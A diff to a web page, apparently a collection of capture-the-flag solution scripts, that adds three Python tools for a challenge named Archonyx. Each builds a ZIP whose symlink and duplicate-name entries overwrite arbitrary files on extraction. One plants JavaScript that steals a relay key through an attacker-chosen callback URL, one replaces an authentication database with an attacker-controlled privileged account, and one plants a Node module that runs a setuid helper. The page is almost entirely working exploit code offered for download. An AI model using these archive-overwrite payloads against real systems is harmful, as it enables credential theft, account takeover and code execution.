@@ -156,6 +156,315 @@
 
 <hr>
 
+<h2>manifest_mischief.py</h2>
+
+<p>Creates the duplicate-entry ZIP used in the Archonyx relay-key stage. Builds a symlink entry and a regular entry with the same name so extraction overwrites an arbitrary target through the operating system's link resolution.</p>
+
+<p>Source: <a href="/archonyx.html">Archonyx</a>. Download: <a href="/scripts/manifest_mischief.py">manifest_mischief.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;Build the duplicate-entry archive used in the Archonyx relay-key stage.&quot;&quot;&quot;</span>
+
+<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">annotations</span>
+
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">stat</span>
+<span class="kn">import</span> <span class="nn">zipfile</span>
+<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlencode</span><span class="p">,</span> <span class="n">urlsplit</span>
+
+
+<span class="n">DEFAULT_OUTPUT</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&quot;relay_hijack.zip&quot;</span><span class="p">)</span>
+<span class="n">DEFAULT_TARGET</span> <span class="o">=</span> <span class="s2">&quot;/app/public/theme.js&quot;</span>
+
+
+<span class="k">def</span> <span class="nf">callback_url</span><span class="p">(</span><span class="n">base_url</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">parsed</span> <span class="o">=</span> <span class="n">urlsplit</span><span class="p">(</span><span class="n">base_url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">parsed</span><span class="o">.</span><span class="n">scheme</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">{</span><span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="s2">&quot;https&quot;</span><span class="p">}</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">parsed</span><span class="o">.</span><span class="n">netloc</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentTypeError</span><span class="p">(</span>
+            <span class="s2">&quot;callback must be an absolute HTTP or HTTPS URL&quot;</span>
+        <span class="p">)</span>
+    <span class="k">return</span> <span class="n">base_url</span>
+
+
+<span class="k">def</span> <span class="nf">build_archive</span><span class="p">(</span><span class="n">output</span><span class="p">:</span> <span class="n">Path</span><span class="p">,</span> <span class="n">target</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">callback</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">query_prefix</span> <span class="o">=</span> <span class="n">urlencode</span><span class="p">({</span><span class="s2">&quot;stage&quot;</span><span class="p">:</span> <span class="s2">&quot;relay-key&quot;</span><span class="p">,</span> <span class="s2">&quot;key&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">})</span>
+    <span class="n">callback_prefix</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">callback</span><span class="si">}{</span><span class="s1">&#39;&amp;&#39;</span> <span class="k">if</span> <span class="s1">&#39;?&#39;</span> <span class="ow">in</span> <span class="n">callback</span> <span class="k">else</span> <span class="s1">&#39;?&#39;</span><span class="si">}{</span><span class="n">query_prefix</span><span class="si">}</span><span class="s2">&quot;</span>
+
+    <span class="n">javascript</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">fetch(&#39;/api/relay-key&#39;, </span><span class="se">{{</span><span class="s2">credentials: &#39;include&#39;</span><span class="se">}}</span><span class="s2">)</span>
+<span class="s2">  .then(response =&gt; response.json())</span>
+<span class="s2">  .then(result =&gt; </span><span class="se">{{</span>
+<span class="s2">    location.href =</span>
+<span class="s2">      </span><span class="si">{</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">callback_prefix</span><span class="p">)</span><span class="si">}</span>
+<span class="s2">      + encodeURIComponent(result.data);</span>
+<span class="s2">  </span><span class="se">}}</span><span class="s2">);</span>
+<span class="s2">&quot;&quot;&quot;</span><span class="o">.</span><span class="n">lstrip</span><span class="p">()</span>
+
+    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">archive</span><span class="p">:</span>
+        <span class="n">link</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipInfo</span><span class="p">(</span><span class="s2">&quot;theme.js&quot;</span><span class="p">)</span>
+        <span class="n">link</span><span class="o">.</span><span class="n">create_system</span> <span class="o">=</span> <span class="mi">3</span>
+        <span class="n">link</span><span class="o">.</span><span class="n">external_attr</span> <span class="o">=</span> <span class="p">(</span><span class="n">stat</span><span class="o">.</span><span class="n">S_IFLNK</span> <span class="o">|</span> <span class="mo">0o777</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
+        <span class="n">link</span><span class="o">.</span><span class="n">compress_type</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_STORED</span>
+        <span class="n">archive</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">link</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
+
+        <span class="n">replacement</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipInfo</span><span class="p">(</span><span class="s2">&quot;theme.js&quot;</span><span class="p">)</span>
+        <span class="n">replacement</span><span class="o">.</span><span class="n">create_system</span> <span class="o">=</span> <span class="mi">3</span>
+        <span class="n">replacement</span><span class="o">.</span><span class="n">external_attr</span> <span class="o">=</span> <span class="p">(</span><span class="n">stat</span><span class="o">.</span><span class="n">S_IFREG</span> <span class="o">|</span> <span class="mo">0o600</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
+        <span class="n">replacement</span><span class="o">.</span><span class="n">compress_type</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_STORED</span>
+        <span class="n">archive</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">replacement</span><span class="p">,</span> <span class="n">javascript</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">parse_args</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">argparse</span><span class="o">.</span><span class="n">Namespace</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
+        <span class="n">description</span><span class="o">=</span><span class="p">(</span>
+            <span class="s2">&quot;Create the duplicate-entry ZIP used to replace Archonyx theme.js.&quot;</span>
+        <span class="p">)</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s2">&quot;--callback&quot;</span><span class="p">,</span>
+        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+        <span class="nb">type</span><span class="o">=</span><span class="n">callback_url</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Callback URL that receives the recovered relay key.&quot;</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s2">&quot;--output&quot;</span><span class="p">,</span>
+        <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="n">DEFAULT_OUTPUT</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;Output archive path. Default: </span><span class="si">{</span><span class="n">DEFAULT_OUTPUT</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s2">&quot;--target&quot;</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="n">DEFAULT_TARGET</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;Symlink target. Default: </span><span class="si">{</span><span class="n">DEFAULT_TARGET</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">build_archive</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">callback</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;created=</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span></code></pre></div>
+
+<hr>
+
+<h2>ledger_coup.py</h2>
+
+<p>Creates the duplicate-entry ZIP used to replace the Archonyx authentication database. Uses the same symlink-then-regular-file primitive to overwrite db.json with a controlled Ledgermaster account.</p>
+
+<p>Source: <a href="/archonyx.html">Archonyx</a>. Download: <a href="/scripts/ledger_coup.py">ledger_coup.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;Build the duplicate-entry database archive used in Archonyx.&quot;&quot;&quot;</span>
+
+<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">annotations</span>
+
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">stat</span>
+<span class="kn">import</span> <span class="nn">zipfile</span>
+<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+
+
+<span class="n">DEFAULT_OUTPUT</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&quot;ledger_coup.zip&quot;</span><span class="p">)</span>
+<span class="n">DEFAULT_TARGET</span> <span class="o">=</span> <span class="s2">&quot;/app/data/db.json&quot;</span>
+
+
+<span class="k">def</span> <span class="nf">build_archive</span><span class="p">(</span>
+    <span class="n">output</span><span class="p">:</span> <span class="n">Path</span><span class="p">,</span>
+    <span class="n">target</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+    <span class="n">username</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+    <span class="n">password_hash</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+    <span class="n">api_key</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+<span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">database</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;users&quot;</span><span class="p">:</span> <span class="p">[</span>
+            <span class="p">{</span>
+                <span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+                <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">password_hash</span><span class="p">,</span>
+                <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;ledgermaster&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;verified&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+                <span class="s2">&quot;apiKey&quot;</span><span class="p">:</span> <span class="n">api_key</span><span class="p">,</span>
+                <span class="s2">&quot;drawsId&quot;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
+            <span class="p">}</span>
+        <span class="p">],</span>
+        <span class="s2">&quot;convoys&quot;</span><span class="p">:</span> <span class="p">[],</span>
+    <span class="p">}</span>
+
+    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">archive</span><span class="p">:</span>
+        <span class="n">link</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipInfo</span><span class="p">(</span><span class="s2">&quot;db.json&quot;</span><span class="p">)</span>
+        <span class="n">link</span><span class="o">.</span><span class="n">create_system</span> <span class="o">=</span> <span class="mi">3</span>
+        <span class="n">link</span><span class="o">.</span><span class="n">external_attr</span> <span class="o">=</span> <span class="p">(</span><span class="n">stat</span><span class="o">.</span><span class="n">S_IFLNK</span> <span class="o">|</span> <span class="mo">0o777</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
+        <span class="n">link</span><span class="o">.</span><span class="n">compress_type</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_STORED</span>
+        <span class="n">archive</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">link</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
+
+        <span class="n">replacement</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipInfo</span><span class="p">(</span><span class="s2">&quot;db.json&quot;</span><span class="p">)</span>
+        <span class="n">replacement</span><span class="o">.</span><span class="n">create_system</span> <span class="o">=</span> <span class="mi">3</span>
+        <span class="n">replacement</span><span class="o">.</span><span class="n">external_attr</span> <span class="o">=</span> <span class="p">(</span><span class="n">stat</span><span class="o">.</span><span class="n">S_IFREG</span> <span class="o">|</span> <span class="mo">0o600</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
+        <span class="n">replacement</span><span class="o">.</span><span class="n">compress_type</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_STORED</span>
+        <span class="n">archive</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span>
+            <span class="n">replacement</span><span class="p">,</span>
+            <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">database</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">),</span>
+        <span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">parse_args</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">argparse</span><span class="o">.</span><span class="n">Namespace</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
+        <span class="n">description</span><span class="o">=</span><span class="p">(</span>
+            <span class="s2">&quot;Create the duplicate-entry ZIP used to replace Archonyx db.json.&quot;</span>
+        <span class="p">)</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--username&quot;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s2">&quot;--password-hash&quot;</span><span class="p">,</span>
+        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Precomputed bcrypt password hash.&quot;</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--api-key&quot;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s2">&quot;--output&quot;</span><span class="p">,</span>
+        <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="n">DEFAULT_OUTPUT</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;Output archive path. Default: </span><span class="si">{</span><span class="n">DEFAULT_OUTPUT</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s2">&quot;--target&quot;</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="n">DEFAULT_TARGET</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;Symlink target. Default: </span><span class="si">{</span><span class="n">DEFAULT_TARGET</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">build_archive</span><span class="p">(</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">,</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">username</span><span class="p">,</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">password_hash</span><span class="p">,</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">api_key</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;created=</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span></code></pre></div>
+
+<hr>
+
+<h2>seal_sorcery.py</h2>
+
+<p>Creates the duplicate-entry ZIP used to place the Archonyx Less plugin. Plants a Node.js module that invokes a setuid helper and writes the result to the public directory.</p>
+
+<p>Source: <a href="/archonyx.html">Archonyx</a>. Download: <a href="/scripts/seal_sorcery.py">seal_sorcery.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;Build the duplicate-entry Less plugin archive used in Archonyx.&quot;&quot;&quot;</span>
+
+<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">annotations</span>
+
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">stat</span>
+<span class="kn">import</span> <span class="nn">zipfile</span>
+<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+
+
+<span class="n">DEFAULT_OUTPUT</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&quot;seal_sorcery.zip&quot;</span><span class="p">)</span>
+<span class="n">DEFAULT_TARGET</span> <span class="o">=</span> <span class="s2">&quot;/tmp/seal_plugin.js&quot;</span>
+<span class="n">DEFAULT_PROOF_PATH</span> <span class="o">=</span> <span class="s2">&quot;/app/public/clearance-proof.txt&quot;</span>
+<span class="n">DEFAULT_HELPER</span> <span class="o">=</span> <span class="s2">&quot;/readflag&quot;</span>
+
+
+<span class="k">def</span> <span class="nf">build_archive</span><span class="p">(</span>
+    <span class="n">output</span><span class="p">:</span> <span class="n">Path</span><span class="p">,</span>
+    <span class="n">target</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+    <span class="n">helper</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+    <span class="n">proof_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+<span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">plugin</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">const fs = require(&#39;fs&#39;);</span>
+<span class="s2">const cp = require(&#39;child_process&#39;);</span>
+
+<span class="s2">module.exports = </span><span class="se">{{</span>
+<span class="s2">  install() </span><span class="se">{{</span>
+<span class="s2">    const flag = cp.execFileSync(</span>
+<span class="s2">      </span><span class="si">{</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">helper</span><span class="p">)</span><span class="si">}</span><span class="s2">,</span>
+<span class="s2">      </span><span class="se">{{</span><span class="s2"> encoding: &#39;utf8&#39; </span><span class="se">}}</span>
+<span class="s2">    );</span>
+<span class="s2">    fs.writeFileSync(</span>
+<span class="s2">      </span><span class="si">{</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">proof_path</span><span class="p">)</span><span class="si">}</span><span class="s2">,</span>
+<span class="s2">      flag</span>
+<span class="s2">    );</span>
+<span class="s2">  </span><span class="se">}}</span>
+<span class="se">}}</span><span class="s2">;</span>
+<span class="s2">&quot;&quot;&quot;</span><span class="o">.</span><span class="n">lstrip</span><span class="p">()</span>
+
+    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">archive</span><span class="p">:</span>
+        <span class="n">link</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipInfo</span><span class="p">(</span><span class="s2">&quot;seal_plugin.js&quot;</span><span class="p">)</span>
+        <span class="n">link</span><span class="o">.</span><span class="n">create_system</span> <span class="o">=</span> <span class="mi">3</span>
+        <span class="n">link</span><span class="o">.</span><span class="n">external_attr</span> <span class="o">=</span> <span class="p">(</span><span class="n">stat</span><span class="o">.</span><span class="n">S_IFLNK</span> <span class="o">|</span> <span class="mo">0o777</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
+        <span class="n">link</span><span class="o">.</span><span class="n">compress_type</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_STORED</span>
+        <span class="n">archive</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">link</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
+
+        <span class="n">replacement</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipInfo</span><span class="p">(</span><span class="s2">&quot;seal_plugin.js&quot;</span><span class="p">)</span>
+        <span class="n">replacement</span><span class="o">.</span><span class="n">create_system</span> <span class="o">=</span> <span class="mi">3</span>
+        <span class="n">replacement</span><span class="o">.</span><span class="n">external_attr</span> <span class="o">=</span> <span class="p">(</span><span class="n">stat</span><span class="o">.</span><span class="n">S_IFREG</span> <span class="o">|</span> <span class="mo">0o600</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
+        <span class="n">replacement</span><span class="o">.</span><span class="n">compress_type</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_STORED</span>
+        <span class="n">archive</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">replacement</span><span class="p">,</span> <span class="n">plugin</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">parse_args</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">argparse</span><span class="o">.</span><span class="n">Namespace</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
+        <span class="n">description</span><span class="o">=</span><span class="p">(</span>
+            <span class="s2">&quot;Create the duplicate-entry ZIP used to place the Archonyx Less plugin.&quot;</span>
+        <span class="p">)</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s2">&quot;--output&quot;</span><span class="p">,</span>
+        <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="n">DEFAULT_OUTPUT</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;Output archive path. Default: </span><span class="si">{</span><span class="n">DEFAULT_OUTPUT</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s2">&quot;--target&quot;</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="n">DEFAULT_TARGET</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;Symlink target. Default: </span><span class="si">{</span><span class="n">DEFAULT_TARGET</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s2">&quot;--helper&quot;</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="n">DEFAULT_HELPER</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;Privileged helper path. Default: </span><span class="si">{</span><span class="n">DEFAULT_HELPER</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s2">&quot;--proof-path&quot;</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="n">DEFAULT_PROOF_PATH</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;Proof output path. Default: </span><span class="si">{</span><span class="n">DEFAULT_PROOF_PATH</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">build_archive</span><span class="p">(</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">,</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">helper</span><span class="p">,</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">proof_path</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;created=</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span></code></pre></div>
+
+<hr>
+
 <h2>corpse_sync.py</h2>
 
 <p>Decodes the anomalous audit log produced by the CorpSyncAudit challenge. Matches timestamp and region records, reverses the five-bit conditional XOR transformations, packs six numeric fields into 32-bit words, and recovers four payload bytes per record.</p>
